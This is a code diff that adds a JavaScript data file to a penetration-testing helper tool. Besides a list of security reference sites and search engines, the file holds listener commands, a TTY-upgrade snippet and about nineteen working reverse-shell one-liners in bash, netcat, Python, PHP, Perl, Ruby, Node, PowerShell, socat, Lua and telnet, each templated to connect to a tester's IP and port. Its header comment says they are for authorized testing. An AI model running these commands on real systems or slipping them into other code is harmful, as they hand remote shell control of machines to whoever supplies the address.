@@ -1,0 +1,65 @@
+/* WARM — extra datasets: curated dork sites, reverse shells, listeners.
+ * Reverse-shell commands template {tester_ip} / {tester_port} from the Scope panel.
+ * These are standard, well-known offensive references for authorized testing only.
+ */
+
+/* Curated web-app pentest / security reference sites.
+ * `dork` is the site: expression used in search; `url` is the direct link. */
+window.DORK_SITES = [
+  { name: "HackTricks",            dork: "site:hacktricks.xyz",                               url: "https://book.hacktricks.xyz" },
+  { name: "HackTricks Cloud",      dork: "site:cloud.hacktricks.xyz",                         url: "https://cloud.hacktricks.xyz" },
+  { name: "PayloadsAllTheThings",  dork: "site:github.com/swisskyrepo/PayloadsAllTheThings",  url: "https://github.com/swisskyrepo/PayloadsAllTheThings" },
+  { name: "InternalAllTheThings",  dork: "site:swisskyrepo.github.io/InternalAllTheThings",   url: "https://swisskyrepo.github.io/InternalAllTheThings" },
+  { name: "PentestMonkey",         dork: "site:pentestmonkey.net",                            url: "https://pentestmonkey.net" },
+  { name: "GTFOBins",              dork: "site:gtfobins.github.io",                           url: "https://gtfobins.github.io" },
+  { name: "LOLBAS",                dork: "site:lolbas-project.github.io",                     url: "https://lolbas-project.github.io" },
+  { name: "WADComs",               dork: "site:wadcoms.github.io",                            url: "https://wadcoms.github.io" },
+  { name: "OWASP Cheat Sheets",    dork: "site:cheatsheetseries.owasp.org",                   url: "https://cheatsheetseries.owasp.org" },
+  { name: "OWASP WSTG",            dork: "site:owasp.org/www-project-web-security-testing-guide", url: "https://owasp.org/www-project-web-security-testing-guide/" },
+  { name: "PortSwigger Academy",   dork: "site:portswigger.net/web-security",                 url: "https://portswigger.net/web-security" },
+  { name: "ired.team",             dork: "site:ired.team",                                    url: "https://www.ired.team" },
+  { name: "revshells.com",         dork: "site:revshells.com",                                url: "https://www.revshells.com" },
+  { name: "Exploit-DB",            dork: "site:exploit-db.com",                               url: "https://www.exploit-db.com" }
+];
+
+window.DORK_ENGINES = [
+  { name: "Google",     base: "https://www.google.com/search?q=" },
+  { name: "DuckDuckGo", base: "https://duckduckgo.com/?q=" },
+  { name: "Bing",       base: "https://www.bing.com/search?q=" },
+  { name: "Startpage",  base: "https://www.startpage.com/sp/search?query=" }
+];
+
+window.LISTENERS = [
+  { name: "netcat",       cmd: `nc -lvnp {tester_port}` },
+  { name: "rlwrap nc",    cmd: `rlwrap -cAr nc -lvnp {tester_port}` },
+  { name: "socat (TTY)",  cmd: 'socat file:`tty`,raw,echo=0 TCP-L:{tester_port}' },
+  { name: "pwncat",       cmd: `pwncat-cs -lp {tester_port}` }
+];
+
+/* TTY upgrade reminder shown on the Reverse Shells tab. */
+window.TTY_UPGRADE = [
+  `python3 -c 'import pty;pty.spawn("/bin/bash")'`,
+  `# then: Ctrl-Z  ->  stty raw -echo; fg  ->  export TERM=xterm`
+];
+
+window.REVSHELLS = [
+  { lang: "bash",       name: "bash -i",        cmd: `bash -i >& /dev/tcp/{tester_ip}/{tester_port} 0>&1` },
+  { lang: "bash",       name: "bash 196",       cmd: `0<&196;exec 196<>/dev/tcp/{tester_ip}/{tester_port}; sh <&196 >&196 2>&196` },
+  { lang: "bash",       name: "bash (read line)",cmd: `exec 5<>/dev/tcp/{tester_ip}/{tester_port};cat <&5 | while read line; do $line 2>&5 >&5; done` },
+  { lang: "bash",       name: "bash UDP",       cmd: `sh -i >& /dev/udp/{tester_ip}/{tester_port} 0>&1` },
+  { lang: "sh",         name: "sh mkfifo",      cmd: `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {tester_ip} {tester_port} >/tmp/f` },
+  { lang: "netcat",     name: "nc -e",          cmd: `nc {tester_ip} {tester_port} -e /bin/sh` },
+  { lang: "netcat",     name: "nc.traditional", cmd: `nc.traditional -e /bin/sh {tester_ip} {tester_port}` },
+  { lang: "netcat",     name: "nc mkfifo (OpenBSD)", cmd: `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {tester_ip} {tester_port} >/tmp/f` },
+  { lang: "python",     name: "python3 pty",    cmd: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{tester_ip}",{tester_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'` },
+  { lang: "python",     name: "python3 short",  cmd: `export RHOST="{tester_ip}";export RPORT={tester_port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'` },
+  { lang: "php",        name: "php exec",        cmd: `php -r '$sock=fsockopen("{tester_ip}",{tester_port});exec("/bin/sh -i <&3 >&3 2>&3");'` },
+  { lang: "php",        name: "php system",      cmd: `php -r '$sock=fsockopen("{tester_ip}",{tester_port});system("/bin/sh -i <&3 >&3 2>&3");'` },
+  { lang: "perl",       name: "perl",            cmd: `perl -e 'use Socket;$i="{tester_ip}";$p={tester_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
+  { lang: "ruby",       name: "ruby",            cmd: `ruby -rsocket -e'f=TCPSocket.open("{tester_ip}",{tester_port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
+  { lang: "node",       name: "node.js",         cmd: `node -e 'sh=require("child_process").spawn("/bin/sh");net=require("net");c=new net.Socket();c.connect({tester_port},"{tester_ip}",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});'` },
+  { lang: "powershell", name: "powershell #1",   cmd: `powershell -nop -W hidden -noni -c "$c=New-Object System.Net.Sockets.TCPClient('{tester_ip}',{tester_port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"` },
+  { lang: "socat",      name: "socat",           cmd: `socat TCP:{tester_ip}:{tester_port} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane` },
+  { lang: "lua",        name: "lua",             cmd: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('{tester_ip}','{tester_port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"` },
+  { lang: "telnet",     name: "telnet",          cmd: `TF=$(mktemp -u);mkfifo $TF && telnet {tester_ip} {tester_port} 0<$TF | /bin/sh 1>$TF` }
+];
